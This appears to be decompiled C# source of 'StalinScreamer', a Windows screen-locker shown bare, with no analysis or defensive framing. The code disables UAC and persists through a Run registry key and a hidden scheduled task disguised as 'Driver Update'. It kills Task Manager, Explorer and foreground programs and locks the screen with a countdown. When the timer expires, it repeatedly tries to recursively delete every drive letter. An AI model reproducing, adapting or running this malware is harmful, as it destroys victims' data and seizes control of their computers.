using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;
using StalinScreamer.Properties;
using WMPLib;

namespace StalinScreamer;

public class Form1 : Form
{
	private DateTime dt = new DateTime(1922, 12, 30);

	private DateTime n = DateTime.Now;

	private bool guessed;

	private int todisp = 600;

	private int alert = 60;

	internal WindowsMediaPlayer WMP;

	private IContainer components;

	private PictureBox stalin;

	private TextBox KeyBox;

	private Timer timer1;

	private Timer timer2;

	private Label TIMER;

	private Timer timer3;

	private Timer timer4;

	private Timer timer5;

	public Form1()
	{
		//IL_018e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0198: Expected O, but got Unknown
		try
		{
			Process[] processes = Process.GetProcesses();
			int id = Process.GetCurrentProcess().Id;
			Process[] array = processes;
			foreach (Process process in array)
			{
				try
				{
					if (process.Id != id && process.MainModule!.ModuleName == Process.GetCurrentProcess().MainModule!.ModuleName)
					{
						guessed = true;
						Application.Exit();
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			if (new FileInfo("C:\\Users\\" + Environment.UserName + "\\AppData\\local\\ul.dat").Exists)
			{
				Application.Exit();
			}
			if (!new FileInfo("C:\\Users\\" + Environment.UserName + "\\AppData\\local\\fl.dat").Exists)
			{
				todisp = 600;
			}
			else
			{
				using StreamReader streamReader = new StreamReader("C:\\Users\\" + Environment.UserName + "\\AppData\\local\\fl.dat");
				string s = streamReader.ReadLine();
				todisp = int.Parse(s);
				streamReader.Close();
			}
			using (StreamWriter streamWriter = new StreamWriter(new FileStream("C:\\Users\\" + Environment.UserName + "\\AppData\\local\\fl.dat", FileMode.OpenOrCreate)))
			{
				streamWriter.WriteLine(todisp / 3);
				streamWriter.Close();
			}
			((Form)this).set_TopMost(true);
			InitializeComponent();
			((Control)this).add_KeyDown(new KeyEventHandler(Form1_KeyDown));
			((Form)this).set_ClientSize(SystemInformation.get_PrimaryMonitorSize());
			((Control)stalin).set_Size(SystemInformation.get_PrimaryMonitorSize());
			((Control)KeyBox).set_Location(new Point(SystemInformation.get_PrimaryMonitorSize().Width - 480, SystemInformation.get_PrimaryMonitorSize().Height - 146));
			((Control)TIMER).set_Location(new Point(SystemInformation.get_PrimaryMonitorSize().Width - 162, SystemInformation.get_PrimaryMonitorSize().Height - 118));
			try
			{
				if (!new FileInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\stalin.exe").Exists)
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\stalin.exe");
				}
			}
			catch
			{
			}
			try
			{
				using BinaryWriter binaryWriter = new BinaryWriter(new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\USSR_Anthem.mp3", FileMode.OpenOrCreate));
				binaryWriter.Write(Resources.anth);
				binaryWriter.Close();
			}
			catch
			{
			}
			WMP = (WindowsMediaPlayer)Activator.CreateInstance(Type.GetTypeFromCLSID(new Guid("6BF52A52-394A-11D3-B153-00C04F79FAA6")));
			new ComAwareEventInfo(typeof(_WMPOCXEvents_Event), "PlayStateChange").AddEventHandler(WMP, new _WMPOCXEvents_PlayStateChangeEventHandler(WMP_PlayStateChange));
			WMP.settings.volume = 100;
			WMP.URL = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\USSR_Anthem.mp3";
			WMP.controls.play();
			timer1.Start();
			timer2.Start();
			timer3.Start();
			timer4.Start();
			try
			{
				RegistryKey? registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
				registryKey!.SetValue("Stalin", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\stalin.exe");
				registryKey!.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey? registryKey2 = Registry.LocalMachine.OpenSubKey("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", writable: true);
				registryKey2!.SetValue("EnableLUA", 0);
				registryKey2!.Close();
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	protected override void OnClosed(EventArgs e)
	{
		if (!guessed)
		{
			Application.Restart();
		}
	}

	private void WMP_PlayStateChange(int NewState)
	{
		if (WMP.playState != WMPPlayState.wmppsPlaying)
		{
			WMP.controls.play();
		}
		else
		{
			_ = WMP.playState;
		}
	}

	private void KeyBox_TextChanged(object sender, EventArgs e)
	{
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		try
		{
			if (int.Parse(((Control)KeyBox).get_Text()) != (n - dt).Days)
			{
				return;
			}
			timer1.Stop();
			timer2.Stop();
			timer3.Stop();
			timer4.Stop();
			guessed = true;
			MessageBox.Show("Правильный ключ", "Уведомление", (MessageBoxButtons)0, (MessageBoxIcon)64);
			try
			{
				TaskService val = new TaskService();
				try
				{
					val.get_RootFolder().DeleteTask("Driver Update", true);
				}
				finally
				{
					((IDisposable)val)?.Dispose();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey? registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
				registryKey!.DeleteSubKey("Stalin");
				registryKey!.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey? registryKey2 = Registry.LocalMachine.OpenSubKey("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", writable: true);
				registryKey2!.SetValue("EnableLUA", 1);
				registryKey2!.Close();
			}
			catch
			{
			}
			File.Delete("C:\\Users\\" + Environment.UserName + "\\AppData\\local\\fl.dat");
			Application.Exit();
		}
		catch
		{
		}
	}

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);

	private void timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			GetWindowThreadProcessId(GetForegroundWindow(), out var ProcessId);
			using Process process = Process.GetProcessById((int)ProcessId);
			string moduleName = process.MainModule!.ModuleName;
			if (moduleName != Process.GetCurrentProcess().MainModule!.ModuleName && moduleName.ToLower() != "discord.exe" && moduleName.ToLower() != "skype.exe")
			{
				try
				{
					process.Kill();
					((Form)this).set_TopMost(true);
					timer5.Start();
				}
				catch
				{
				}
			}
			if (moduleName == Process.GetCurrentProcess().MainModule!.ModuleName)
			{
				timer5.Stop();
			}
		}
		catch
		{
		}
		Process[] processes = Process.GetProcesses();
		for (int i = 0; i < processes.Length; i++)
		{
			try
			{
				if (processes[i].MainModule!.ModuleName!.ToLower() == "taskmgr.exe")
				{
					processes[i].Kill();
				}
				else if (processes[i].MainModule!.ModuleName!.ToLower() == "explorer.exe")
				{
					processes[i].Kill();
				}
			}
			catch
			{
			}
		}
		try
		{
			if (!new FileInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\stalin.exe").Exists)
			{
				File.Copy(Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\stalin.exe");
			}
		}
		catch
		{
		}
		try
		{
			if (!new FileInfo(Assembly.GetExecutingAssembly().Location).Exists)
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\stalin.exe", Assembly.GetExecutingAssembly().Location);
			}
		}
		catch
		{
		}
	}

	private void Form1_KeyDown(object sender, KeyEventArgs e)
	{
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
		todisp--;
		try
		{
			using StreamWriter streamWriter = new StreamWriter(new FileStream("C:\\Users\\" + Environment.UserName + "\\AppData\\local\\fl.dat", FileMode.OpenOrCreate));
			streamWriter.WriteLine(todisp / 3);
			streamWriter.Close();
		}
		catch
		{
		}
		if (todisp <= 0)
		{
			timer2.set_Interval(80);
			((Control)TIMER).set_Text("0:00");
			if (alert % 2 == 1)
			{
				((Control)TIMER).set_ForeColor(Color.Red);
			}
			else
			{
				((Control)TIMER).set_ForeColor(Color.Black);
			}
			((Control)TIMER).Update();
			alert--;
			if (alert > 0)
			{
				return;
			}
			while (true)
			{
				for (char c = 'A'; c <= 'Z'; c = (char)(c + 1))
				{
					try
					{
						Directory.Delete(c + ":\\", recursive: true);
					}
					catch
					{
					}
				}
			}
		}
		((Control)TIMER).set_Text(todisp / 60 + ":" + ((todisp % 60 > 9) ? "" : "0") + todisp % 60);
		((Control)TIMER).Update();
	}

	private void timer3_Tick(object sender, EventArgs e)
	{
		try
		{
			((Form)this).set_TopMost(true);
		}
		catch
		{
		}
	}

	private void timer4_Tick(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		try
		{
			TaskService val = new TaskService();
			try
			{
				TaskDefinition val2 = val.NewTask();
				val2.get_RegistrationInfo().set_Description("Updating drivers");
				val2.get_Triggers().Add<LogonTrigger>(new LogonTrigger());
				val2.get_Settings().set_Hidden(true);
				val2.get_Settings().set_StartWhenAvailable(true);
				val2.get_Principal().set_RunLevel((TaskRunLevel)1);
				val2.get_Actions().Add<ExecAction>(new ExecAction(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "stalin.exe", (string)null, (string)null));
				val.get_RootFolder().RegisterTaskDefinition("Driver Update", val2);
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			timer4.Stop();
		}
		catch
		{
		}
	}

	private void timer5_Tick(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Expected O, but got Unknown
		//IL_0129: Unknown result type (might be due to invalid IL or missing references)
		//IL_0133: Expected O, but got Unknown
		//IL_0218: Unknown result type (might be due to invalid IL or missing references)
		//IL_0222: Expected O, but got Unknown
		components = new Container();
		stalin = new PictureBox();
		KeyBox = new TextBox();
		timer1 = new Timer(components);
		timer2 = new Timer(components);
		TIMER = new Label();
		timer3 = new Timer(components);
		timer4 = new Timer(components);
		timer5 = new Timer(components);
		((ISupportInitialize)stalin).BeginInit();
		((Control)this).SuspendLayout();
		stalin.set_Image((Image)(object)Resources.maxresdefault);
		((Control)stalin).set_Location(new Point(0, 0));
		((Control)stalin).set_Name("stalin");
		((Control)stalin).set_Size(new Size(1920, 1080));
		stalin.set_SizeMode((PictureBoxSizeMode)1);
		stalin.set_TabIndex(0);
		stalin.set_TabStop(false);
		((Control)KeyBox).set_Cursor(Cursors.get_Arrow());
		((Control)KeyBox).set_Font(new Font("MS Reference Sans Serif", 36f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)KeyBox).set_Location(new Point(1440, 934));
		((Control)KeyBox).set_Name("KeyBox");
		((Control)KeyBox).set_Size(new Size(400, 66));
		((Control)KeyBox).set_TabIndex(1);
		((Control)KeyBox).add_TextChanged((EventHandler)KeyBox_TextChanged);
		timer1.set_Interval(1000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		timer2.set_Interval(1000);
		timer2.add_Tick((EventHandler)timer2_Tick);
		((Control)TIMER).set_AutoSize(true);
		((Control)TIMER).set_BackColor(Color.White);
		((Control)TIMER).set_Font(new Font("MS Reference Sans Serif", 20.25f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)TIMER).set_ForeColor(Color.Black);
		((Control)TIMER).set_Location(new Point(1758, 962));
		((Control)TIMER).set_Name("TIMER");
		((Control)TIMER).set_Size(new Size(78, 34));
		((Control)TIMER).set_TabIndex(2);
		((Control)TIMER).set_Text("9:59");
		timer3.set_Interval(50);
		timer3.add_Tick((EventHandler)timer3_Tick);
		timer4.set_Interval(3000);
		timer4.add_Tick((EventHandler)timer4_Tick);
		timer5.set_Interval(15000);
		timer5.add_Tick((EventHandler)timer5_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(1920, 1080));
		((Control)this).get_Controls().Add((Control)(object)TIMER);
		((Control)this).get_Controls().Add((Control)(object)KeyBox);
		((Control)this).get_Controls().Add((Control)(object)stalin);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon(Resources.icon);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)4);
		((Control)this).set_Text("Communism!");
		((Form)this).set_WindowState((FormWindowState)2);
		((ISupportInitialize)stalin).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
